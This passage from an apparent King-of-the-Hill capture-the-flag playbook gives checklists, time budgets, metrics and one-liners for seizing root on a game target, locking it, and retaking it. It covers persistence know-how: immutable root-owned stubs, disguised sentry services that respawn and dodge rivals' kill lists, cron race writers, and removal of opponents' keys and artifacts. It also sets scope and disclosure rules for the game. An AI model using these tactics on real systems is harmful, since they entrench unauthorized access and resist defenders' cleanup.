export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# absolute paths for everything; no bare command names
```

Also: no `while true` without `sleep`, no 1 ms writer loops, no `find /` in a
hot loop, no mass `pkill` by class. If load spikes, kill **your** processes
first and check `uptime`/`ss` before continuing.

### 7.5 Fair-play key handling

- Maintain your key **append-only**: `grep -qF "$PUB" || echo >>`.
- Do not continuously rewrite `authorized_keys` to only your key; that evicts
  every other player on a timer and is auto-hardening.
- A **one-time** cleanup of a key that is actively being used to attack you is a
  gray area; prefer closing the entry path instead. If you do it, do it once,
  manually, and log it.
- Never put a private key on the target. Never reuse a key across engagements.

### 7.6 Scope discipline

- One target. The opponent's IP is not in scope — do not scan or attack it.
- No outbound callbacks to infrastructure you do not own; stage payloads in the
  target's writable dir or serve from your own host only if the engagement
  allows it.
- Keep a command log with timestamps; it is your evidence if a move is
  questioned.

### 7.7 If you break a rule

Stop the action, restore the previous state (restart the service, remove the
firewall rule, revert the config), note it in the incident log with UTC time and
impact, and disclose it in the report. Do not hide it; an accidental 2-minute
outage disclosed is survivable, a concealed one is not.

---

## 8. Time budgets and checklists

### 8.1 Budgets

| Milestone | Target | Hard stop | Notes |
|---|---|---|---|
| Recon (ports + stack + current king) | **20 s** | 40 s | parallel, `-T4`, top ports |
| First foothold | 40 s | 90 s | pre-staged adapter |
| First root | **≤ 3 min** | 5 min | ranked vector, 60 s/vector |
| Lock vector | **≤ 60 s after root** | 90 s | immutable stub |
| King + key | +5 s | +15 s | atomic |
| Sentries installed | +30 s | +60 s | idempotent installer |
| **Stable crown** | **≤ 5 min total** | 8 min | lock + sentries + verify |
| Retake after loss | **≤ 90 s** | 3 min | §8.6 |
| Losses per hour | **≤ 1** | 3 | otherwise the vector is open |

### 8.2 Recon checklist (20 s)

- [ ] `nmap -Pn -T4 -p22,80,8000-8010,9999 --open <TARGET>` running in background.
- [ ] `curl -s -m 4 "$CHECKER_URL"` → current king.
- [ ] `curl -s -m 4 http://<TARGET>:<web-ports>/ | grep -i '<title'`.
- [ ] Known eval/upload endpoint probed with `id`.
- [ ] Record: open ports, stack, current king, first candidate vector.

### 8.3 Capture checklist

- [ ] Foothold confirmed with `id` (record user/uid).
- [ ] `discover.sh` output saved (`rank|vector|path|why|eta`).
- [ ] Top vector chosen; 60 s timer started.
- [ ] Root proof written (`/root/.proof` = `uid=0`).
- [ ] **Vector locked before anything else.**

### 8.4 Lock checklist (60 s)

- [ ] `ROOT_CRON_TARGET` replaced by root-owned stub, `755`, `+i`.
- [ ] `lsattr` shows `i`; `stat` shows `root:root`.
- [ ] `sudoers.d` alternate entries removed; `visudo -c` clean.
- [ ] Foreign SUID copies removed; no new SUID since boot.
- [ ] Enemy units/cron/binaries stopped and removed (if rules allow).
- [ ] `authorized_keys` contains our key; no unknown keys (or documented).
- [ ] Re-verified after 60 s: stub still `+i`, cron still points at it.

### 8.5 Hold checklist

- [ ] `king.txt` = `EXPECT_KING`, byte count correct, `+i`.
- [ ] Checker returns our name **3×**.
- [ ] Root SSH with our key works (`ssh -i ... root@<TARGET> id`).
- [ ] Sentry A and B both alive (`pgrep -af`), units `active`/`enabled`.
- [ ] Cron fallback present, `600`, `+i`.
- [ ] Log append-only (`lsattr` shows `a`), has entries.
- [ ] All original ports listening (`ss -tlnp`).
- [ ] No enemy artifacts (`ENEMY_ARTIFACTS` absent, `ENEMY_SERVICES` inactive).
- [ ] No foreign root process (`ps -u root -o pid,args`).
- [ ] Flags still readable/unchanged (if in scope).

### 8.6 Retake timeline (≤ 90 s)

| t | Action |
|---|---|
| 0–10 s | `curl "$CHECKER_URL"`; check foothold alive (`id`); confirm loss is real |
| 10–20 s | Diagnose: `lsattr` target, who references it, writer PID alive? (§5.5) |
| 20–30 s | Stage payload in `STAGE_DIR`; start 4 ms atomic writer if target writable |
| 30–80 s | Wait for `:00`; watch `.ran` marker and checker |
| 80–90 s | If not ours: check writer alive, payload present, target immutable; switch vector or stage dir |

Rules: do not wait passively for the next minute; do not reset; do not mass-kill.
If the target is immutable, go to another vector immediately (§5.6).

### 8.7 Pre-finish checklist

- [ ] Crown stable for ≥ 2 minutes (checker sampled 3×, 60 s apart).
- [ ] Lock artifacts immutable and root-owned.
- [ ] Sentries alive after a deliberate `kill` of one (watchdog respawns it).
- [ ] No accidental service outage: `ss -tlnp` + one HTTP request per port.
- [ ] No rule violation pending; incident log written.
- [ ] Report contains: timeline, vectors, evidence, residual risks.

---

## 9. Post-incident metrics

Collect from the run log and the target's own log. Numbers, not adjectives.

| Metric | Definition | v1 actual | Target |
|---|---|---|---|
| TTF (time to foothold) | start → first `id` | ~1 min | ≤ 40 s |
| TTR (time to root) | start → `uid=0` | ~3 min | ≤ 3 min |
| TTL (time to lock) | root → vector immutable | ~40 min | **≤ 60 s** |
| TTS (time to stable crown) | start → 2 min uninterrupted | ~32 min | **≤ 5 min** |
| MTTL (mean time to loss) | mean capture lifetime | 2–5 min | ≥ 60 min |
| Losses/hour | crown flips against us | 5 | **≤ 1** |
| Retake time | loss → checker ours | 2–6 min | **≤ 90 s** |
| Writer win rate | cron fires our payload / attempts | ~50 % | ≥ 90 % |
| Self-kills | `pkill` killed our own session | 3 | **0** |
| Enemy artifacts removed | count per phase | 7 | tracked |
| Downtime caused | seconds any service unavailable | ~90 s | **0** |

Derived checks:

```sh
# flips per hour from a checker sample log (one value per line with timestamp)
awk -F'|' '{ if (NR>1 && $2!=prev) { flips++; print $1, prev"->"$2 } prev=$2 }
           END { print "flips="flips }' logs/checker.log

# capture lifetimes
awk -F'|' '/CAPTURE|LOSS/ {print $1, $2}' logs/timeline.log

# verify no self-kill: every pkill line in the run log must contain a bracket
grep -n 'pkill' logs/run.log | grep -v '\[' && echo "UNBRACKETED PKILL FOUND"
```

Post-mortem questions (answer in the report):

1. Which vector did the enemy use to return? Was it the one we left open?
2. How long was the window between first root and lock?
3. Did the enemy have a faster writer? What interval did they use?
4. Did our sentries survive a targeted kill? If not, why (name, path, unit)?
5. Did any action cause service downtime or rule violation?
6. Which metric missed target, and what single change fixes it?

---

## 10. Lessons encoded (v1 → v2)

| v1 mistake | Cost | v2 control |
|---|---|---|
| Celebrated before locking `backup.sh` | ~40 min of ping-pong | lock step is mandatory, 60 s budget |
| Predictable sentry names in enemy kill list | ~15 min, 4 losses | neutral names, §4.1 |
| Non-atomic writes | cron syntax errors, lost races | tmp+`rename`, §5 |
| Rewrote the file, not the generator | ~21 min | generator hunt, §5.5 |
| Staged in `/tmp` | payload wiped | `STAGE_DIR` off `/tmp` |
| `chmod` before `chown` | SUID silently cleared | documented order, §3.6 |
| `sudo PATH=/tmp` recursion | fork storm, Apache down | `export PATH`, absolute paths, §7.4 |
| `pkill -f kothguard` self-kill | 3 lost sessions | bracket patterns, §4.5 |
| "PwnKit patched" from one failure | wrong attribution, 5 min | version check + `id` proof, §6 |
| Too many parallel agents | conflicts, duplicated work | 1 assault + 1 audit, sequential rest |

---

## Appendix A — verification one-liners

```sh
# crown
curl -s "$CHECKER_URL"; echo
ssh -i "$OUR_IDENTITY" root@"$TARGET" 'cat /root/king.txt | xxd; lsattr /root/king.txt'

# lock
ssh -i "$OUR_IDENTITY" root@"$TARGET" \
  'lsattr /home/*/backups/backup.sh /root/king.txt 2>/dev/null; \
   stat -c "%n %U:%G %a %s" /home/*/backups/backup.sh /root/king.txt 2>/dev/null'

# sentries
ssh -i "$OUR_IDENTITY" root@"$TARGET" \
  'systemctl is-active sysmon svcwatch; pgrep -af "\.(sysmon|svcwatch)"'

# enemy artifacts
ssh -i "$OUR_IDENTITY" root@"$TARGET" \
  'ls -la /etc/cron.d /usr/local/bin /usr/local/sbin 2>/dev/null | grep -Ei "koth|guard|hill" || echo clean'

# services
ssh -i "$OUR_IDENTITY" root@"$TARGET" 'ss -tlnp'

# root proof
ssh -i "$OUR_IDENTITY" root@"$TARGET" 'id; cat /root/.proof 2>/dev/null'
```

## Appendix B — retake driver

```sh
# one command, 90 s budget, checker-aware; --payload is required for the cron vector
./kit-retake/retake.sh --config koth.conf \
  --payload <your-root-payload.sh> --timeout 90 --cycles 2

# dry plan only
./kit-retake/retake.sh --config koth.conf --payload <your-root-payload.sh> --dry-run
```

On failure it prints a diagnosis block: target immutable? payload present?
writer alive? cron still references the target? — and a `NEXT ACTION` line.
Read that line before retrying; blind retries are how the 21-minute stall
happened.
